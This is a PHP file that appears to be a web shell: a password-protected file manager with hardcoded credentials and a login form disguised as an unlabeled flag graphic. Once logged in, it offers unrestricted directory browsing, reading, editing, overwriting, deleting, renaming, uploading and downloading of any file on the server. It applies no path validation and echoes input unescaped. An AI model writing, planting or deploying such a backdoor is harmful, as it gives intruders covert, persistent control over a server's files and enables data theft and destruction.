<?php
session_start();

$validUsers = array(
    'user0' => 'pass0',
    'userwin' => 'passwin',
);

function cekOtentikasi($username, $password) {
    global $validUsers;
    if (isset($validUsers[$username]) && $validUsers[$username] === $password) {
        return true;
    }
    return false; 
}


if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['login'])) {
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

    if (cekOtentikasi($username, $password)) {

        $_SESSION['loggedin'] = true;
        $_SESSION['username'] = $username;
    } else {

        $pesanError = "Username atau Password salah.";
    }
}


if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}


if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    ?>
    <!DOCTYPE html>
<html>
<head>
<style>
body {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.flag {
    width: 200px;
    height: 100px;
    position: relative;
    display: flex;
    flex-direction: column;

}

.stripe {
    flex: 1;
    width: 100%;
color:orange;
font-size:25px;

}

.stripe-black {
    background-color: #000;

}

.stripe-white {
    background-color: #fff;
}

.stripe-green {
    background-color: #009900;
}


.triangle-left{
      width: 0;
    height: 0;
    border-top: 50px solid transparent;
    border-bottom: 50px solid transparent;
    border-left: 65px solid #FF0000;
    position: absolute;
    left: 0;
    z-index: 2;
}
.iflag { width: 200px; height: 100px; position: relative;bottom:100px;left:250px; display: flex; flex-direction: column; background: linear-gradient(to bottom, red 50%, white 50%); border: 1px solid black; color: white; /* Mengatur warna teks agar terlihat di atas latar belakang */ padding: 10px 20px; /* Sesuaikan ukuran padding sesuai kebutuhan Anda */ }

</style>
</head>
<body><div>
<?php if (isset($pesanError)) echo "<p>$pesanError</p>";echo"<p>"; ?>
<form method="post">
    <div class="flag">
        <input class="stripe stripe-black" value="" name="username"> <input class="stripe stripe-white" value="" name="password"> <input readonly class="stripe stripe-green"> <div class="triangle-left"></div></div><input type="submit" class="iflag" name="login" value=""> </form>
</body>
</html>
    <?php
    exit;
}


    $dir = isset($_GET['dir']) ? rtrim($_GET['dir'], '/') . '/' : './';

    if (isset($_POST['text']) && isset($_POST['file'])) {
        file_put_contents($_POST['file'], $_POST['text']);
    }

    if (isset($_GET['delete'])) {
        unlink($_GET['delete']);
    }

    if (isset($_POST['newname']) && isset($_POST['oldname'])) {
        rename($_POST['oldname'], $_POST['newname']);
    }

    if (isset($_POST['newfile'])) {
        file_put_contents($dir.$_POST['newfile'], '');
    }

    if (isset($_POST['newdir'])) {
        mkdir($dir.$_POST['newdir']);
    }

    if (isset($_FILES['fileupload'])) {
        move_uploaded_file($_FILES['fileupload']['tmp_name'], $dir.$_FILES['fileupload']['name']);
    }

    if (isset($_GET['download'])) {
        $file = $_GET['download'];

        if (file_exists($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
    }

    $files = scandir($dir);
?>


<!DOCTYPE html>
<html>
<head>
    <title>Halaman Admin</title>
    <link rel='stylesheet' type='text/css' href='style.css'>
</head>
<body>
    <h1>Selamat datang, <?php echo $_SESSION['username']; ?>!</h1>
    <a href="?logout">Logout</a><center>

<body><center><a href="?">home</a> 
<p>
    <table style="width:80%;border:2px solid black;background:;color:black;">
        <tr style="border:2px solid black;background:red;color:gold;">
            <th style="border:2px solid black;background:;color:black;">Nama File</th>
            <th>edit</th><th>delete</th><th>download</th>
        </tr>
        <?php

                                    $homedir = getcwd();
                                    $dir = realpath($_GET['dir']) . "/";

                                    echo "<center><b><p align='left'>&nbsp;Home:</b> <a href='?'>$homedir 

                                            &nbsp;</a><b>

                                            <form action='' method='GET'>

                                            &nbsp;Path:</b>

                                            <input type='hidden' name='w' value='fm'>

                                            <input type='text' name='dir' size='80' value='$dir'>

                                            <input type='submit' value='dir'>

                                            </form>

                                        </center>";

            foreach ($files as $file) {
                if (is_dir($dir.$file)) {
                    echo '<tr><td><a href="?dir='.$dir.$file.'">'.$file.'</a></td><td></td></tr>';
                } else {
                    echo '<tr><td>'.$file.'</td><td><a href="?edit='.$dir.$file.'">edit</a> </td><td><a href="?delete='.$dir.$file.'">delete</a> </td><td> <a href="?download='.$dir.$file.'">download</a></td></tr>';
                }
            }
        ?>
    </table>

    <p></p><form method="POST" enctype="multipart/form-data">
        <input type="file" name="fileupload">
        <input type="submit" value="Upload">
    </form><p>

    <form method="POST">
        <input type="text" name="newfile" placeholder="New file name">
        <input type="submit" value="Create File">
    </form>

    <form method="POST">
        <input type="text" name="newdir" placeholder="New directory name">
        <input type="submit" value="Create Directory">
    </form>

    <?php
        if (isset($_GET['edit'])) {
            $content = file_get_contents($_GET['edit']);
            echo '<p><form method="POST">
                <textarea style="width:500px;height:500px" name="text">'.$content.'</textarea>
                <input type="hidden" name="file" value="'.$_GET['edit'].'">
                <input type="submit">
            </form><p>';
        }
    ?>

    <form method="POST">
        <input type="text" name="oldname" placeholder="Old name">
        <input type="text" name="newname" placeholder="New name">
        <input type="submit" value="Rename">
    </form>
</body>
</html>
